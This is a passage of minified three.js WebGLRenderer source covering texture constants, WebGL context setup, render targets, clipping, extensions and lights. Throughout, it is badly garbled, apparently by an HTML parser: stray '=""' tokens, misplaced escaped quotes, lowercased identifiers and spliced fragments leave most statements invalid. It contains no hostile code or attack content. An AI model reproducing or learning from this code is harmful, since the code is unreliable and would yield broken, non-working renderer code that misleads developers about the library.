x.mirrored_repeat;if(a=\"==THREE.NearestFilter)return\" x.nearest;if(a=\"==THREE.NearestMipMapNearestFilter)return\" x.nearest_mipmap_nearest;=\"\" x.nearest_mipmap_linear;if(a=\"==THREE.LinearFilter)return\" x.linear;if(a=\"==THREE.LinearMipMapNearestFilter)return\" x.linear_mipmap_nearest;if(a=\"==THREE.LinearMipMapLinearFilter)return\" x.linear_mipmap_linear;if(a=\"==THREE.UnsignedByteType)return\" x.unsigned_byte;if(a=\"==THREE.UnsignedShort4444Type)return\" x.unsigned_short_4_4_4_4;if(a=\"==THREE.UnsignedShort5551Type)return\" x.unsigned_short_5_5_5_1;if(a=\"==THREE.UnsignedShort565Type)return\" x.unsigned_short_5_6_5;=\"\" x.byte;if(a=\"==THREE.ShortType)return\" x.short;if(a=\"==THREE.UnsignedShortType)return\" x.unsigned_short;if(a=\"==THREE.IntType)return\" x.int;if(a=\"==THREE.UnsignedIntType)return\" x.unsigned_int;if(a=\"==THREE.FloatType)return\" x.float;b=\"U.get(\" oes_texture_half_float\");if(null!=\"=b&&a===THREE.HalfFloatType)return\"\" b.half_float_oes;if(a=\"==THREE.AlphaFormat)return\" x.alpha;if(a=\"==THREE.RGBFormat)return\" x.rgb;if(a=\"==THREE.RGBAFormat)return\" x.rgba;if(a=\"==THREE.LuminanceFormat)return\" x.luminance;=\"\" x.luminance_alpha;if(a=\"==THREE.DepthFormat)return\" x.depth_component;if(a=\"==THREE.AddEquation)return\" x.func_add;if(a=\"==THREE.SubtractEquation)return\" x.func_subtract;if(a=\"==THREE.ReverseSubtractEquation)return\" x.func_reverse_subtract;if(a=\"==THREE.ZeroFactor)return\" x.zero;if(a=\"==THREE.OneFactor)return\" x.one;if(a=\"==THREE.SrcColorFactor)return\" x.src_color;if(a=\"==THREE.OneMinusSrcColorFactor)return\" x.one_minus_src_color;if(a=\"==THREE.SrcAlphaFactor)return\" x.src_alpha;=\"\" x.one_minus_src_alpha;if(a=\"==THREE.DstAlphaFactor)return\" x.dst_alpha;if(a=\"==THREE.OneMinusDstAlphaFactor)return\" x.one_minus_dst_alpha;if(a=\"==THREE.DstColorFactor)return\" x.dst_color;if(a=\"==THREE.OneMinusDstColorFactor)return\" x.one_minus_dst_color;if(a=\"==THREE.SrcAlphaSaturateFactor)return\" x.src_alpha_saturate;b=\"U.get(\" webgl_compressed_texture_s3tc\");if(null!=\"=b){if(a===THREE.RGB_S3TC_DXT1_Format)return\"\" b.compressed_rgb_s3tc_dxt1_ext;if(a=\"==THREE.RGBA_S3TC_DXT1_Format)return\" b.compressed_rgba_s3tc_dxt1_ext;=\"\" b.compressed_rgba_s3tc_dxt3_ext;if(a=\"==THREE.RGBA_S3TC_DXT5_Format)return\" b.compressed_rgba_s3tc_dxt5_ext}b=\"U.get(\" webgl_compressed_texture_pvrtc\");if(null!=\"=b){if(a===THREE.RGB_PVRTC_4BPPV1_Format)return\"\" b.compressed_rgb_pvrtc_4bppv1_img;if(a=\"==THREE.RGB_PVRTC_2BPPV1_Format)return\" b.compressed_rgb_pvrtc_2bppv1_img;if(a=\"==THREE.RGBA_PVRTC_4BPPV1_Format)return\" b.compressed_rgba_pvrtc_4bppv1_img;if(a=\"==THREE.RGBA_PVRTC_2BPPV1_Format)return\" b.compressed_rgba_pvrtc_2bppv1_img}b=\"U.get(\" webgl_compressed_texture_etc1\");if(null!=\"=b&&a===THREE.RGB_ETC1_Format)return\"\" b.compressed_rgb_etc1_webgl;b=\"U.get(\" ext_blend_minmax\");if(null!=\"=b){if(a===THREE.MinEquation)return\"\" b.min_ext;if(a=\"==THREE.MaxEquation)return\" b.max_ext}return=\"\" 0}console.log(\"three.webglrenderer\",three.revision);a=\"a||{};var\" v=\"void\" void=\"\" float32array(8),l=\"[],O=[];this.domElement=v;this.context=null;this.sortObjects=this.autoClearStencil=this.autoClearDepth=this.autoClearColor=this.autoClear=!0;this.clippingPlanes=[];this.localClippingEnabled=!1;this.gammaFactor=2;this.physicallyCorrectLights=this.gammaOutput=this.gammaInput=\" !1;this.tonemapping=\"THREE.LinearToneMapping;this.toneMappingWhitePoint=this.toneMappingExposure=1;this.maxMorphTargets=8;this.maxMorphNormals=4;var\" three.vector4,ja=\"null,ba=new\" three.vector4,ia=\"0,V=new\" three.color(0),y=\"0,ra=v.width,sa=v.height,$=1,ua=new\" three.vector4(0,0,ra,sa),xa=\"!1,ma=new\" three.vector4(0,0,ra,sa),wa=\"new\" three.frustum,ca=\"new\" three.webglclipping,qa=\"!1,va=!1,ha=new\" three.sphere,pa=\"new\" three.matrix4,w=\"new\" three.vector3,s=\"{hash:\" \",\"=\"\" ambient:[0,0,0],directional:[],directionalshadowmap:[],directionalshadowmatrix:[],spot:[],spotshadowmap:[],spotshadowmatrix:[],point:[],pointshadowmap:[],pointshadowmatrix:[],hemi:[],shadows:[]},fa=\"{calls:0,vertices:0,faces:0,points:0};this.info={render:fa,memory:{geometries:0,textures:0},programs:null};var\" x;try{w=\"{alpha:w,depth:E,stencil:z,antialias:y,premultipliedAlpha:A,preserveDrawingBuffer:I};x=C||v.getContext(\" webgl\",w)||v.getcontext(\"experimental-webgl\",w);if(null=\"==x){if(null!==v.getContext(\"webgl\"))throw\"Error\"\" creating=\"\" webgl=\"\" context=\"\" with=\"\" your=\"\" selected attributes.\";=\"\" throw\"error=\"\" context.\";}void=\"\" \"+za)}var=\"\" u=\"new\" three.webglextensions(x);u.get(\"webgl_depth_texture\");u.get(\"oes_texture_float\");u.get(\"oes_texture_float_linear\");u.get(\"oes_texture_half_float\");u.get(\"oes_texture_half_float_linear\");u.get(\"oes_standard_derivatives\");u.get(\"angle_instanced_arrays\");=\"\" u.get(\"oes_element_index_uint\")&&(three.buffergeometry.maxindex=\"4294967296);var\" da=\"new\" three.webglcapabilities(x,u,a),r=\"new\" three.webglstate(x,u,u),z=\"new\" three.webglproperties,ka=\"new\" three.webgltextures(x,u,r,z,da,u,this.info),ea=\"new\" three.webglobjects(x,z,this.info),na=\"new\" three.webglprograms(this,da),ta=\"new\" three.webgllights;this.info.programs=\"na.programs;var\" aa=\"new\" three.webglbufferrenderer(x,u,fa),ba=\"new\" three.webglindexedbufferrenderer(x,u,fa),ca=\"new\" three.orthographiccamera(-1,1,1,-1,0,1),la=\"new\" three.perspectivecamera,oa=\"new\" three.mesh(new=\"\" three.planebuffergeometry(2,2),new=\"\" three.meshbasicmaterial({depthtest:!1,depthwrite:!1}));a=\"THREE.ShaderLib.cube;var\" ga=\"new\" three.boxbuffergeometry(5,5,5),new=\"\" three.shadermaterial({uniforms:a.uniforms,vertexshader:a.vertexshader,fragmentshader:a.fragmentshader,depthtest:!1,depthwrite:!1,side:three.backside}));ea.update(oa);ea.update(ga);c();this.context=\"x;this.capabilities=da;this.extensions=U;this.properties=Z;this.state=R;var\" ya=\"new\" three.webglshadowmap(this,=\"\" s,ea);this.shadowmap=\"ya;var\" three.spriteplugin(this,l),ea=\"new\" three.lensflareplugin(this,o);this.getcontext=\"function(){return\" x};this.getcontextattributes=\"function(){return\" x.getcontextattributes()};this.forcecontextloss=\"function(){U.get(\" webgl_lose_context\").losecontext()};this.getmaxanisotropy=\"function(){return\"\" da.getmaxanisotropy()};this.getprecision=\"function(){return\" da.precision};this.getpixelratio=\"function(){return\" $};this.setpixelratio=\"function(a){void\" ma.w,!1))};this.getsize=\"function(){return{width:ra,height:sa}};this.setSize=function(a,b,c){ra=a;sa=b;v.width=a*$;v.height=b*$;!1!==c&&(v.style.width=a+\" px\",v.style.height=\"b+\"px\");this.setViewport(0,0,a,b)};this.setViewport=function(a,b,c,d){R.viewport(ma.set(a,b,c,d))};this.setScissor=function(a,b,c,d){R.scissor(ua.set(a,b,c,d))};this.setScissorTest=function(a){R.setScissorTest(xa=a)};this.getClearColor=function(){return\"\" v};this.setclearcolor=\"function(a,c){V.set(a);Y=void\" y)};this.getclearalpha=\"function(){return\" y};this.setclearalpha=\"function(a){Y=a;b(V.r,V.g,V.b,Y)};this.clear=function(a,b,c){var\" d;this.dispose=\"function(){P=[];M=-1;F=[];K=-1;v.removeEventListener(\" webglcontextlost\",e,!1)};this.renderbufferimmediate=\"function(a,b,c){R.initAttributes();var\"\" r.enableattribute(b.position),x.vertexattribpointer(b.position,3,x.float,!1,0,0));if(a.hasnormals){x.bindbuffer(x.array_buffer,d.normal);if(\"meshphongmaterial\"!=\"=c.type&&\" meshstandardmaterial\"!=\"=c.type&&\"MeshPhysicalMaterial\"!==c.type&&c.shading===THREE.FlatShading)for(var\"\" a.normalarray,x.dynamic_draw);r.enableattribute(b.normal);x.vertexattribpointer(b.normal,3,x.float,!1,0,0)}a.hasuvs&&c.map&&(x.bindbuffer(x.array_buffer,d.uv),x.bufferdata(x.array_buffer,a.uvarray,x.dynamic_draw),r.enableattribute(b.uv),x.vertexattribpointer(b.uv,2,x.float,!1,0,0));a.hascolors&&c.vertexcolors!=\"=THREE.NoColors&&(x.bindBuffer(x.ARRAY_BUFFER,d.color),x.bufferData(x.ARRAY_BUFFER,a.colorArray,x.DYNAMIC_DRAW),R.enableAttribute(b.color),x.vertexAttribPointer(b.color,3,x.FLOAT,!1,0,0));R.disableUnusedAttributes();\" x.drawarrays(x.triangles,0,a.count);a.count=\"0};this.renderBufferDirect=function(a,b,c,d,e,g){r(d);var\" f=\"s(a,b,d,e),k=!1;a=c.id+\" _\"+f.id+\"_\"+d.wireframe;a!=\"=aa&&(aa=a,k=!0);b=e.morphTargetInfluences;if(void\"\" m=\"0,k=b.length;m<k;m++){var\" c.addattribute(\"morphnormal\"+m,n.normal[b])):(!0=\"==d.morphTargets&&c.removeAttribute(\" morphtarget\"+m),!0=\"==d.morphNormals&&c.removeAttribute(\"morphNormal\"+m));f.getUniforms().setValue(x,\"morphTargetInfluences\",H);k=!0}b=c.index;m=c.attributes.position;!0===d.wireframe&&(b=ea.getWireframeAttribute(c));null!==b?(a=Ba,a.setIndex(b)):a=Aa;if(k){a:{var\"\" k=\"void\" 0,p;if(c=\"\" three.instancedbuffergeometry&&(p=\"U.get(\" angle_instanced_arrays\"),null=\"==p)){console.error(\"THREE.WebGLRenderer.setupVertexAttributes:\"\" using=\"\" three.instancedbuffergeometry=\"\" but=\"\" hardware=\"\" does=\"\" not=\"\" support=\"\" extension=\"\" angle_instanced_arrays.\");=\"\" break=\"\" a}void=\"\" f){var=\"\" w=\"x.FLOAT,C=u.array,t=u.normalized;C\" float32array?w=\"x.FLOAT:C\" float64array?console.warn(\"unsupported=\"\" data=\"\" buffer=\"\" format:=\"\" float64array\"):c=\"\" uint16array?w=\"x.UNSIGNED_SHORT:C\" int16array?w=\"x.SHORT:C\" uint32array?w=\"x.UNSIGNED_INT:C\" int32array?w=\"x.INT:C\" int8array?=\"\" uint8array&&(w=\"x.UNSIGNED_BYTE);var\" three.interleavedbufferattribute){var=\"\" z=\"u.data,A=z.stride,u=u.offset;z\" three.instancedinterleavedbuffer?(r.enableattributeanddivisor(v,z.meshperattribute,p),void=\"\" three.instancedbufferattribute?(r.enableattributeanddivisor(v,u.meshperattribute,p),void=\"\" 2:x.vertexattrib2fv(v,w);break;case=\"\" 3:x.vertexattrib3fv(v,w);break;case=\"\" 4:x.vertexattrib4fv(v,w);break;default:x.vertexattrib1fv(v,w)}}}r.disableunusedattributes()}null!=\"=\" b&&x.bindbuffer(x.element_array_buffer,ea.getattributebuffer(b))}p=\"Infinity;null!==b?p=b.count:void\" three.mesh)if(!0=\"==d.wireframe)R.setLineWidth(d.wireframeLinewidth*(null===J?$:1)),a.setMode(x.LINES);else\" switch(e.drawmode){case=\"\" three.trianglesdrawmode:a.setmode(x.triangles);break;case=\"\" three.trianglestripdrawmode:a.setmode(x.triangle_strip);=\"\" break;case=\"\" three.trianglefandrawmode:a.setmode(x.triangle_fan)}else=\"\" three.line?(d=\"d.linewidth,void\" three.linesegments?a.setmode(x.lines):a.setmode(x.line_strip)):e=\"\" three.points&&a.setmode(x.points);c=\"\" three.instancedbuffergeometry?0<c.maxinstancedcount&&a.renderinstances(c,g,p):a.render(g,p)};this.render=\"function(a,c,d,e){if(!1===c\" three.camera)console.error(\"three.webglrenderer.render:=\"\" camera=\"\" is=\"\" an=\"\" instance=\"\" of=\"\" three.camera.\");=\"\" else{var=\"\" (s.shadows[h++]=\"v)}S.shadows.length=h;ya.render(a,c);for(var\" three.ambientlight)v+=\"u.r*w,r+=u.g*w,s+=u.b*w;else\" if(n=\"\" three.directionallight){var=\"\" d.direction.sub(w);d.direction.transformdirection(h);if(d.shadow=\"n.castShadow)D.shadowBias=n.shadow.bias,D.shadowRadius=n.shadow.radius,D.shadowMapSize=n.shadow.mapSize;S.directionalShadowMap[y]=t;S.directionalShadowMatrix[y]=n.shadow.matrix;S.directional[y++]=D}else\" three.spotlight){d=\"ta.get(n);D.position.setFromMatrixPosition(n.matrixWorld);D.position.applyMatrix4(H);D.color.copy(u).multiplyScalar(w);D.distance=C;D.direction.setFromMatrixPosition(n.matrixWorld);W.setFromMatrixPosition(n.target.matrixWorld);\" d.direction.sub(w);d.direction.transformdirection(h);d.conecos=\"Math.cos(n.angle);D.penumbraCos=Math.cos(n.angle*(1-n.penumbra));D.decay=0===n.distance?0:n.decay;if(D.shadow=n.castShadow)D.shadowBias=n.shadow.bias,D.shadowRadius=n.shadow.radius,D.shadowMapSize=n.shadow.mapSize;S.spotShadowMap[J]=t;S.spotShadowMatrix[J]=n.shadow.matrix;S.spot[J++]=D}else\" three.pointlight){d=\"ta.get(n);D.position.setFromMatrixPosition(n.matrixWorld);D.position.applyMatrix4(H);D.color.copy(n.color).multiplyScalar(n.intensity);\" d.distance=\"n.distance;D.decay=0===n.distance?0:n.decay;if(D.shadow=n.castShadow)D.shadowBias=n.shadow.bias,D.shadowRadius=n.shadow.radius,D.shadowMapSize=n.shadow.mapSize;S.pointShadowMap[z]=t;void\" three.matrix4);w.setfrommatrixposition(n.matrixworld).negate();s.pointshadowmatrix[z].identity().setposition(w);s.point[z++]=\"D}else\" three.hemispherelight&&(d=\"ta.get(n),D.direction.setFromMatrixPosition(n.matrixWorld),D.direction.transformDirection(H),\" d.direction.normalize(),d.skycolor.copy(n.color).multiplyscalar(w),d.groundcolor.copy(n.groundcolor).multiplyscalar(w),s.hemi[a++]=\"D);S.ambient[0]=v;S.ambient[1]=r;S.ambient[2]=s;S.directional.length=y;S.spot.length=J;S.point.length=z;S.hemi.length=A;S.hash=y+\" ,\"+z+\",\"+j+\",\"+a+\",\"+s.shadows.length;qa&&ca.endshadows();fa.calls=\"0;fa.vertices=0;fa.faces=0;fa.points=0;void\"\" three.color&&b(f.r,f.g,f.b,1);(this.autoclear||=\"\" e)&&this.clear(this.autoclearcolor,this.autocleardepth,this.autoclearstencil);f=\"\" three.cubetexture?(la.projectionmatrix.copy(c.projectionmatrix),la.matrixworld.extractrotation(c.matrixworld),la.matrixworldinverse.getinverse(la.matrixworld),ga.material.uniforms.tcube.value=\"f,ga.modelViewMatrix.multiplyMatrices(la.matrixWorldInverse,ga.matrixWorld),N.renderBufferDirect(la,null,ga.geometry,ga.material,ga,null)):f\" three.texture&&(oa.material.map=\"f,N.renderBufferDirect(Ca,null,oa.geometry,\" oa.material,oa,null));a.overridematerial?(e=\"a.overrideMaterial,q(F,c,g,e),q(P,c,g,e)):(R.setBlending(THREE.NoBlending),q(F,c,g),q(P,c,g));Da.render(a,c);Ea.render(a,c,ba);d&&ka.updateRenderTargetMipmap(d);R.setDepthTest(!0);R.setDepthWrite(!0);R.setColorWrite(!0)}};this.setFaceCulling=function(a,b){R.setCullFace(a);R.setFlipSided(b===THREE.FrontFaceDirectionCW)};this.allocTextureUnit=function(){var\" a=\"ia;a\">=da.maxTextures&&console.warn(\"WebGLRenderer: trying to use \"+a+\" texture units while this GPU supports only \"+\nda.maxTextures);ia+=1;return a};this.setTexture2D=function(){var a=!1;return function(b,c){b instanceof THREE.WebGLRenderTarget&&(a||(console.warn(\"THREE.WebGLRenderer.setTexture2D: don't use render targets as textures. Use their .texture property instead.\"),a=!0),b=b.texture);ka.setTexture2D(b,c)}}();this.setTexture=function(){var a=!1;return function(b,c){a||(console.warn(\"THREE.WebGLRenderer: .setTexture is deprecated, use setTexture2D instead.\"),a=!0);ka.setTexture2D(b,c)}}();this.setTextureCube=\nfunction(){var a=!1;return function(b,c){b instanceof THREE.WebGLRenderTargetCube&&(a||(console.warn(\"THREE.WebGLRenderer.setTextureCube: don't use cube render targets as textures. Use their .texture property instead.\"),a=!0),b=b.texture);b instanceof THREE.CubeTexture||Array.isArray(b.image)&&6===b.image.length?ka.setTextureCube(b,c):ka.setTextureCubeDynamic(b,c)}}();this.getCurrentRenderTarget=function(){return J};this.setRenderTarget=function(a){(J=a)&&void 0===Z.get(a).__webglFramebuffer&&ka.setupRenderTarget(a);\nvar b=a instanceof THREE.WebGLRenderTargetCube,c;a?(c=Z.get(a),c=b?c.__webglFramebuffer[a.activeCubeFace]:c.__webglFramebuffer,X.copy(a.scissor),ja=a.scissorTest,ba.copy(a.viewport)):(c=null,X.copy(ua).multiplyScalar($),ja=xa,ba.copy(ma).multiplyScalar($));D!==c&&(x.bindFramebuffer(x.FRAMEBUFFER,c),D=c);R.scissor(X);R.setScissorTest(ja);R.viewport(ba);b&&(b=Z.get(a.texture),x.framebufferTexture2D(x.FRAMEBUFFER,x.COLOR_ATTACHMENT0,x.TEXTURE_CUBE_MAP_POSITIVE_X+a.activeCubeFace,b.__webglTexture,a.activeMipMapLevel))};\nthis.readRenderTargetPixels=function(a,b,c,d,e,f){if(!1===a instanceof THREE.WebGLRenderTarget)console.error(\"THREE.WebGLRenderer.readRenderTargetPixels: renderTarget is not THREE.WebGLRenderTarget.\");else{var g=Z.get(a).__webglFramebuffer;if(g){var h=!1;g!==D&&(x.bindFramebuffer(x.FRAMEBUFFER,g),h=!0);try{var k=a.texture;k.format!==THREE.RGBAFormat&&u(k.format)!==x.getParameter(x.IMPLEMENTATION_COLOR_READ_FORMAT)?console.error(\"THREE.WebGLRenderer.readRenderTargetPixels: renderTarget is not in RGBA or implementation defined format.\"):\nk.type===THREE.UnsignedByteType||u(k.type)===x.getParameter(x.IMPLEMENTATION_COLOR_READ_TYPE)||k.type===THREE.FloatType&&U.get(\"WEBGL_color_buffer_float\")||k.type===THREE.HalfFloatType&&U.get(\"EXT_color_buffer_half_float\")?x.checkFramebufferStatus(x.FRAMEBUFFER)===x.FRAMEBUFFER_COMPLETE?0<=b&&b<=a.width-d&&0<=c&&c<=a.height-e&&x.readpixels(b,c,d,e,u(k.format),u(k.type),f):console.error(\"three.webglrenderer.readrendertargetpixels: 0=\"==c.minFilter&&(c.minFilter=THREE.LinearFilter);this.texture=new\" readpixels=\"\" from=\"\" rendertarget=\"\" failed.=\"\" framebuffer=\"\" not=\"\" complete.\"):console.error(\"three.webglrenderer.readrendertargetpixels:=\"\" is=\"\" in=\"\" unsignedbytetype=\"\" or=\"\" implementation=\"\" defined=\"\" type.\")}finally{h&&=\"\" x.bindframebuffer(x.framebuffer,d)}}}}};=\"\" three.webglrendertarget=\"function(a,b,c){this.uuid=THREE.Math.generateUUID();this.width=a;this.height=b;this.scissor=new\" three.vector4(0,0,a,b);this.scissortest=\"!1;this.viewport=new\" three.vector4(0,0,a,b);c=\"c||{};void\" three.texture(void=\"\" 0,void=\"\" 0,c.wraps,c.wrapt,c.magfilter,c.minfilter,c.format,c.type,c.anisotropy,c.encoding);this.depthbuffer=\"void\" 0!=\"=c.depthBuffer?c.depthBuffer:!0;this.stencilBuffer=void\" !0;this.depthtexture=\"null};\" object.assign(three.webglrendertarget.prototype,three.eventdispatcher.prototype,{setsize:function(a,b){if(this.width!=\"=a||this.height!==b)this.width=a,this.height=b,this.dispose();this.viewport.set(0,0,a,b);this.scissor.set(0,0,a,b)},clone:function(){return(new\" this.constructor).copy(this)},copy:function(a){this.width=\"a.width;this.height=a.height;this.viewport.copy(a.viewport);this.texture=a.texture.clone();this.depthBuffer=a.depthBuffer;this.stencilBuffer=a.stencilBuffer;this.depthTexture=a.depthTexture;\" return=\"\" this},dispose:function(){this.dispatchevent({type:\"dispose\"})}});three.webglrendertargetcube=\"function(a,b,c){THREE.WebGLRenderTarget.call(this,a,b,c);this.activeMipMapLevel=this.activeCubeFace=0};THREE.WebGLRenderTargetCube.prototype=Object.create(THREE.WebGLRenderTarget.prototype);THREE.WebGLRenderTargetCube.prototype.constructor=THREE.WebGLRenderTargetCube;\" three.webglbufferrenderer=\"function(a,b,c){var\" d;this.setmode=\"function(a){d=a};this.render=function(b,f){a.drawArrays(d,b,f);c.calls++;c.vertices+=f;d===a.TRIANGLES&&(c.faces+=f/3)};this.renderInstances=function(e){var\" f=\"b.get(\" angle_instanced_arrays\");if(null=\"==f)console.error(\"THREE.WebGLBufferRenderer:\"\" using=\"\" three.instancedbuffergeometry=\"\" but=\"\" hardware=\"\" does=\"\" support=\"\" extension=\"\" angle_instanced_arrays.\");else{var=\"\" g=\"e.attributes.position,h=0,h=g\" instanceof=\"\" three.interleavedbufferattribute?g.data.count:=\"\" g.count;f.drawarraysinstancedangle(d,0,h,e.maxinstancedcount);c.calls++;c.vertices+=\"h*e.maxInstancedCount;d===a.TRIANGLES&&(c.faces+=e.maxInstancedCount*h/3)}}};\" three.webglclipping=\"function(){function\" a(){l.value!=\"=d&&(l.value=d,l.needsUpdate=0<e);c.numPlanes=e}function\" b(a,b,d,e){var=\"\" float32array(e);for(e=\"0;e!==f;++e,d+=4)h.copy(a[e]).applyMatrix4(b,k),h.normal.toArray(g,d),g[d+3]=h.constant}l.value=g;l.needsUpdate=!0}c.numPlanes=f;return\" g}var=\"\" c=\"this,d=null,e=0,f=!1,g=!1,h=new\" three.plane,k=\"new\" three.matrix3,=\"\" l=\"{value:null,needsUpdate:!1};this.uniform=l;this.numPlanes=0;this.init=function(a,c,g){var\" h=\"0!==a.length||c||0!==e||f;f=c;d=b(a,g,0);e=a.length;return\" h};this.beginshadows=\"function(){g=!0;b(null)};this.endShadows=function(){g=!1;a()};this.setState=function(c,h,k,q,r){if(!f||null===c||0===c.length||g&&!h)g?b(null):a();else{h=g?0:e;var\" s=\"4*h,t=q.clippingState||null;l.value=t;t=b(c,k,s,r);for(c=0;c!==s;++c)t[c]=d[c];q.clippingState=t;this.numPlanes+=h}}};\" three.webglindexedbufferrenderer=\"function(a,b,c){var\" d,e,f;this.setmode=\"function(a){d=a};this.setIndex=function(c){c.array\" uint32array&&b.get(\"oes_element_index_uint\")?(e=\"a.UNSIGNED_INT,f=4):(e=a.UNSIGNED_SHORT,f=2)};this.render=function(b,h){a.drawElements(d,h,e,b*f);c.calls++;c.vertices+=h;d===a.TRIANGLES&&(c.faces+=h/3)};this.renderInstances=function(g,h,k){var\" angle_instanced_arrays.\"):=\"\" (l.drawelementsinstancedangle(d,k,e,h*f,g.maxinstancedcount),c.calls++,c.vertices+=\"k*g.maxInstancedCount,d===a.TRIANGLES&&(c.faces+=g.maxInstancedCount*k/3))}};\" three.webglextensions=\"function(a){var\" b=\"{};this.get=function(c){if(void\" b[c];var=\"\" d;switch(c){case=\"\" \"webgl_depth_texture\":d=\"a.getExtension(\" webgl_depth_texture\")||a.getextension(\"moz_webgl_depth_texture\")||a.getextension(\"webkit_webgl_depth_texture\");break;case\"=\"\" \"ext_texture_filter_anisotropic\":d=\"a.getExtension(\" ext_texture_filter_anisotropic\")||a.getextension(\"moz_ext_texture_filter_anisotropic\")||a.getextension(\"webkit_ext_texture_filter_anisotropic\");break;case\"=\"\" \"webgl_compressed_texture_s3tc\":d=\"a.getExtension(\" webgl_compressed_texture_s3tc\")||a.getextension(\"moz_webgl_compressed_texture_s3tc\")||a.getextension(\"webkit_webgl_compressed_texture_s3tc\");break;case\"=\"\" \"webgl_compressed_texture_pvrtc\":d=\"a.getExtension(\" webgl_compressed_texture_pvrtc\")||a.getextension(\"webkit_webgl_compressed_texture_pvrtc\");break;case\"=\"\" \"webgl_compressed_texture_etc1\":d=\"a.getExtension(\" webgl_compressed_texture_etc1\");break;default:d=\"a.getExtension(c)}null===d&&console.warn(\"THREE.WebGLRenderer:\"\" \"+c+\"=\"\" supported.\");=\"\" b[c]=\"d}};\" three.webglcapabilities=\"function(a,b,c){function\" d(b){if(\"highp\"=\"==b){if(0<a.getShaderPrecisionFormat(a.VERTEX_SHADER,a.HIGH_FLOAT).precision&&0<a.getShaderPrecisionFormat(a.FRAGMENT_SHADER,a.HIGH_FLOAT).precision)return\" highp\";b=\"mediump\" }return\"mediump\"=\"==b&&0<a.getShaderPrecisionFormat(a.VERTEX_SHADER,a.MEDIUM_FLOAT).precision&&0<a.getShaderPrecisionFormat(a.FRAGMENT_SHADER,a.MEDIUM_FLOAT).precision?\"mediump\":\"lowp\"}var\"\" e;this.getmaxanisotropy=\"function(){if(void\" e;var=\"\" e=\"null!==c?a.getParameter(c.MAX_TEXTURE_MAX_ANISOTROPY_EXT):0};this.getMaxPrecision=d;this.precision=void\" a.getparameter(a.max_vertex_attribs);this.maxvertexuniforms=\"a.getParameter(a.MAX_VERTEX_UNIFORM_VECTORS);this.maxVaryings=a.getParameter(a.MAX_VARYING_VECTORS);this.maxFragmentUniforms=a.getParameter(a.MAX_FRAGMENT_UNIFORM_VECTORS);this.vertexTextures=0<this.maxVertexTextures;this.floatFragmentTextures=!!b.get(\" oes_texture_float\");this.floatvertextextures=\"this.vertexTextures&&this.floatFragmentTextures;c=d(this.precision);c!==this.precision&&(console.warn(\"THREE.WebGLRenderer:\",this.precision,\"not\"\" supported,=\"\" using\",=\"\" c,\"instead.\"),this.precision=\"c);this.logarithmicDepthBuffer&&(this.logarithmicDepthBuffer=!!b.get(\" ext_frag_depth\"))};\"=\"\" three.webglgeometries=\"function(a,b,c){function\" d(a){var=\"\" k=\"a.attributes,l;for(l\" k)e(k[l]);h.removeeventlistener(\"dispose\",d);delete=\"\" f[h.id];l=\"b.get(h);l.wireframe&&e(l.wireframe);b.delete(h);h=b.get(a);h.wireframe&&e(h.wireframe);b.delete(a);c.memory.geometries--}function\" e(c){var=\"\" d;d=\"c\" three.interleavedbufferattribute?b.get(c.data).__webglbuffer:b.get(c).__webglbuffer;void=\"\" three.interleavedbufferattribute?=\"\" b.delete(c.data):b.delete(c))}var=\"\" f[b.id];b.addeventlistener(\"dispose\",d);var=\"\" e;b=\"\" three.buffergeometry?e=\"b:b\" three.geometry&&(void=\"\" three.buffergeometry).setfromobject(a)),e=\"b._bufferGeometry);f[b.id]=e;c.memory.geometries++;return\" e}};=\"\" three.webgllights=\"function(){var\" a=\"{};this.get=function(b){if(void\" a[b.id];var=\"\" c;switch(b.type){case=\"\" \"directionallight\":c=\"{direction:new\" three.vector3,color:new=\"\" three.color,shadow:!1,shadowbias:0,shadowradius:1,shadowmapsize:new=\"\" three.vector2};break;case=\"\" \"spotlight\":c=\"{position:new\" three.vector3,direction:new=\"\" three.color,distance:0,conecos:0,penumbracos:0,decay:0,shadow:!1,shadowbias:0,shadowradius:1,shadowmapsize:new=\"\" \"pointlight\":c=\"{position:new\" three.color,distance:0,decay:0,shadow:!1,shadowbias:0,shadowradius:1,shadowmapsize:new=\"\" \"hemispherelight\":c=\"{direction:new\" three.vector3,skycolor:new=\"\" three.color,groundcolor:new=\"\" three.color}}return=\"\" a[b.id]=\"c}};\" three.webglobjects=\"function(a,b,c){function\" d(c,d){var=\"\" three.interleavedbufferattribute?c.data:c,f=\"b.get(e);void\" dynamic=\"\" three.bufferattribute=\"\" marked=\"\" as=\"\" needsupdate=\"\" updaterange.count=\"\" 0,=\"\" ensure=\"\" you=\"\" are=\"\" set=\"\" methods=\"\" updating=\"\" manually.\"):=\"\" (a.buffersubdata(d,e.updaterange.offset*e.array.bytes_per_element,e.array.subarray(e.updaterange.offset,e.updaterange.offset+e.updaterange.count)),e.updaterange.count=\"0),f.version=e.version)}function\" e(a,b,c){if(b=\"\">c){var d=b;b=c;c=d}d=a[b];return void 0===d?(a[b]=[c],!0):-1===d.indexOf(c)?(d.push(c),!0):!1}var f=new THREE.WebGLGeometries(a,b,c);this.getAttributeBuffer=function(a){return a instanceof THREE.InterleavedBufferAttribute?b.get(a.data).__webglBuffer:b.get(a).__webglBuffer};this.getWireframeAttribute=\nfunction(c){var f=b.get(c);if(void 0!==f.wireframe)return f.wireframe;var k=[],l=c.index,n=c.attributes;c=n.position;if(null!==l)for(var n={},l=l.array,p=0,m=l.length;p<m;p+=3){var q=\"l[p+0],r=l[p+1],s=l[p+2];e(n,q,r)&&k.push(q,r);e(n,r,s)&&k.push(r,s);e(n,s,q)&&k.push(s,q)}else\" for(l=\"n.position.array,p=0,m=l.length/3-1;p<m;p+=3)q=p+0,r=p+1,s=p+2,k.push(q,r,r,s,s,q);k=new\" three.bufferattribute(new=\"\" (65535<c.count?uint32array:uint16array)(k),1);d(k,a.element_array_buffer);return=\"\" f.wireframe=\"k};this.update=\" function(b){var=\"\" c=\"f.get(b);b.geometry\" instanceof=\"\" three.geometry&&c.updatefromobject(b);b=\"c.index;var\" e=\"c.attributes;null!==b&&d(b,a.ELEMENT_ARRAY_BUFFER);for(var\" l=\"\" in=\"\" e)d(e[l],a.array_buffer);b=\"c.morphAttributes;for(l\" b)for(var=\"\" c}};=\"\" three.webglprogram=\"function(){function\" a(a){switch(a){case=\"\" three.linearencoding:return[\"linear\",\"(=\"\" value=\"\" )\"];case=\"\" three.srgbencoding:return[\"srgb\",\"(=\"\" three.rgbeencoding:return[\"rgbe\",\"(=\"\" three.rgbm7encoding:return[\"rgbm\",\"(=\"\" value,=\"\" 7.0=\"\" three.rgbm16encoding:return[\"rgbm\",\"(=\"\" 16.0=\"\" three.rgbdencoding:return[\"rgbd\",\"(=\"\" 256.0=\"\" 